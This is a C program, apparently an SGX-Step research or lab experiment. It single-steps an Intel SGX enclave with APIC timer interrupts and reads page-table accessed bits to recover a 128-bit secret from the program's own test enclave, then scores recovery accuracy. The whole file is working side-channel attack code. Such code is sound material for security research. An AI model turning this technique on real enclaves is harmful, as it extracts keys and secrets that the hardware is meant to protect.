#include <sgx_urts.h>
#include <signal.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>

#include "Enclave/encl_u.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/config.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/elf_parser.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/cache.h"

// #define SECRET_LEN 8
// static uint8_t secret_bits[SECRET_LEN] = {0, 1, 0, 0, 0, 1, 0, 1};
// #define SECRET_LEN 128
// static uint8_t secret_bits[SECRET_LEN] = {
//     1, 0, 1, 1, 0, 0, 1, 0,
//     0, 1, 1, 0, 1, 0, 0, 1,
//     1, 1, 0, 0, 1, 1, 0, 1,
//     0, 0, 1, 0, 1, 1, 1, 0,

//     1, 0, 0, 1, 1, 0, 1, 1,
//     0, 1, 0, 0, 1, 1, 0, 0,
//     1, 1, 1, 0, 0, 0, 1, 1,
//     0, 0, 1, 1, 0, 1, 0, 1,

//     1, 1, 0, 1, 0, 0, 1, 0,
//     0, 0, 1, 1, 1, 0, 1, 1,
//     0, 1, 1, 0, 0, 1, 0, 0,
//     1, 0, 1, 1, 0, 0, 1, 1,

//     0, 1, 0, 0, 1, 1, 0, 1,
//     1, 0, 1, 0, 0, 1, 1, 0,
//     0, 1, 1, 1, 0, 0, 1, 0,
//     1, 0, 0, 1, 1, 0, 1, 0
// };
#define SECRET_LEN 128
static uint8_t secret_bits[SECRET_LEN];

void generate_random_key(uint8_t *key) {
    for (int i = 0; i < SECRET_LEN; i++) {
        key[i] = rand() & 1;  // 0 or 1
    }
}
/* ===================== globals ===================== */
sgx_enclave_id_t eid            = 0;
int irq_cnt                     = 0;
int do_irq                      = 0;
uint64_t *pte_all = NULL;
uint64_t *pte_secret = NULL;
int recovered[SECRET_LEN]       = {0};
int rec_idx                     = 0;
/* ===================== AEP handler ===================== */
typedef enum { IDLE, IN_ALL, ARMED, COOLDOWN } state_t;
state_t state  = IDLE;
int     window = 0;
int     seen   = 0;
int     cool   = 0;

void aep_reset(void){
    state  = IDLE;
    window = 0;
    seen   = 0;
    cool   = 0;
    irq_cnt = 0;
    rec_idx = 0;
    do_irq  = 1;
    memset(recovered, 0, sizeof(recovered));
    *pte_all    = MARK_NOT_ACCESSED(*pte_all);
    *pte_secret = MARK_NOT_ACCESSED(*pte_secret);
    flush(pte_all);
    flush(pte_secret);
}
void aep_cb_func(void){
    irq_cnt++;
    switch (state) {
    case IDLE:
        if (ACCESSED(*pte_all)) {
            *pte_all = MARK_NOT_ACCESSED(*pte_all);
            flush(pte_all);
            /* all_function body is now executing — wait for it to finish */
            state = IN_ALL;
        }
        break;
    case IN_ALL:
        if (ACCESSED(*pte_all)) {
            *pte_all = MARK_NOT_ACCESSED(*pte_all);
            flush(pte_all);
        } else {
            // all_function page no longer accessed — it has returned
            *pte_secret = MARK_NOT_ACCESSED(*pte_secret);
            flush(pte_secret);
            seen   = 0;
            window = 5;
            state  = ARMED;
        }
        break;
    case ARMED:
        if (ACCESSED(*pte_secret)) {
            seen = 1;
            *pte_secret = MARK_NOT_ACCESSED(*pte_secret);
            flush(pte_secret);
            // don't collapse window — just let it expire naturally
            // setting window=1 here can race with the decrement below
        }
        if (ACCESSED(*pte_all)) {
            *pte_all = MARK_NOT_ACCESSED(*pte_all);
            flush(pte_all);
        }
        if (--window == 0) {
            if (rec_idx < SECRET_LEN)
                recovered[rec_idx++] = seen ? 1 : 0;
                // printf("recovered bit %d\n", seen);
            if (rec_idx >= SECRET_LEN) {
                do_irq = 0;
                goto done;
            }
            cool  = 3;
            state = COOLDOWN;
        }
        break;
    case COOLDOWN:
        if (ACCESSED(*pte_all)) {
            *pte_all = MARK_NOT_ACCESSED(*pte_all);
            flush(pte_all);
        }
        if (ACCESSED(*pte_secret)) {
            *pte_secret = MARK_NOT_ACCESSED(*pte_secret);
            flush(pte_secret);
        }
        if (--cool == 0)
            state = IDLE;
        break;
    }
done:
    if (do_irq && irq_cnt < 500000){
        apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    }
    else {
        do_irq = 0;
    }
}
/* ===================== fault handler ===================== */
void fault_handler(int signal) {
    info("fault %d, restoring page perms", signal);
}
/* ===================== setup ===================== */
void attacker_config_runtime(void) {
    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
    print_system_settings();
    register_enclave_info();
    print_enclave_info();
}
void attacker_config_page_table(void) {
    /* point execute-disable at ecall_process_bits to trigger first fault */
    uint64_t base = (uint64_t)get_enclave_base();
    void *all_addr    = (void *)(base + get_symbol_offset("all_function"));
    void *secret_addr = (void *)(base + get_symbol_offset("secret_function"));
    ASSERT(pte_all    = remap_page_table_level(all_addr, PTE));
    ASSERT(pte_secret = remap_page_table_level(secret_addr, PTE));
    ASSERT(PRESENT(*pte_all));
    ASSERT(PRESENT(*pte_secret));
    *pte_all    = MARK_NOT_ACCESSED(*pte_all);
    *pte_secret = MARK_NOT_ACCESSED(*pte_secret);
    flush(pte_all);
    flush(pte_secret);

    /* debug prints */
    info("all_function addr    = %p", all_addr);
    info("secret_function addr = %p", secret_addr);
    info("pte_all    = %p", pte_all);
    info("pte_secret = %p", pte_secret);
    info("all page    = %#lx", (uint64_t)all_addr & ~0xfff);
    info("target page = %#lx", (uint64_t)secret_addr & ~0xfff);
}
/* ===================== main ===================== */
int main(int argc, char **argv){
    sgx_launch_token_t token = {0};
    int updated = 0;
    idt_t idt   = {0};

    srand(time(NULL));  // seed
    generate_random_key(secret_bits);

    /* 1. Create enclave */
    SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so",0,&token,&updated,&eid,NULL));

    /* 2. Dry run to page in enclave memory */
    SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));

    /* 3. Symbol + runtime setup */
    register_symbols("./Enclave/encl.so");
    attacker_config_runtime();           // pins CPU, sets up SIGSEGV handler
    attacker_config_page_table();        // maps PTEs, clears accessed bits

    /* 4. AEP callback registration */
    register_aep_cb(aep_cb_func);

    /* 5. IDT/APIC setup */
    map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);

    /* 6. Verify timer works (optional but useful) */
    __ss_irq_fired = 0;
    apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    while (!__ss_irq_fired);             // spin until one IRQ confirmed
    info("APIC timer confirmed working");

    /* 7. Re-clear accessed bits (dry run + timer test may have dirtied them) */
    *pte_all    = MARK_NOT_ACCESSED(*pte_all);
    *pte_secret = MARK_NOT_ACCESSED(*pte_secret);
    flush(pte_all);
    flush(pte_secret);

    /* 8. Arm timer and immediately enter enclave */
    info_event("Single-stepping enclave...");
    __ss_irq_fired = 0;
    aep_reset();
    apic_timer_irq(SGX_STEP_TIMER_INTERVAL);   // ← last thing before EENTER
    SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));

    info_event("Results:");
    printf("secret:    ");
    for (int i = 0; i < SECRET_LEN; i++) printf("%d ", secret_bits[i]);
    printf("\nrecovered: ");
    for (int i = 0; i < rec_idx; i++) printf("%d ", recovered[i]);
        printf("\n%d",rec_idx);
    int correct = 0;
    for (int i = 0; i < rec_idx; i++)
        if (recovered[i] == secret_bits[i]) correct++;
    printf("\naccuracy:  %d/%d (%.0f%%)\n",
           correct, SECRET_LEN,
           (float)correct / SECRET_LEN * 100);
    int outfile = open("results.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    char buf[256];
    int len = sprintf(buf, "%d\n%.2f\n", rec_idx, (float)correct / SECRET_LEN * 100);
    write(outfile, buf, len);
    close(outfile);

    SGX_ASSERT(sgx_destroy_enclave(eid));
    info("done. total IRQs: %d", irq_cnt);
    return 0;
}